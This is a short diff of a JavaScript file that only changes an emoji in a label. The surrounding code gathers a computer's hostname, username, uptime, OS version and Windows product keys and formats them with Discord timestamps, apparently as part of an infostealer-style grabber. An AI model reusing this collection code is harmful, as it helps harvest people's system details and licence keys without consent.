@@ -23,7 +23,7 @@ const json = async (zipFile) => {
     ['👨 Name', code(os.hostname())],
     ['🕘 Uptime', `<t:${uptime}:R> (<t:${uptime}:f>)`],
     ['🥷 Username', code(os.userInfo().username)],
-    ['🔄️ OS version', os.version()],
+    ['🔄 OS version', os.version()],
     ['🔑 Product Key', code(require('./product-key').productKey)],
     ['🔑 Backup Product Key', code(require('./product-key').backupProductKey)],
   ];
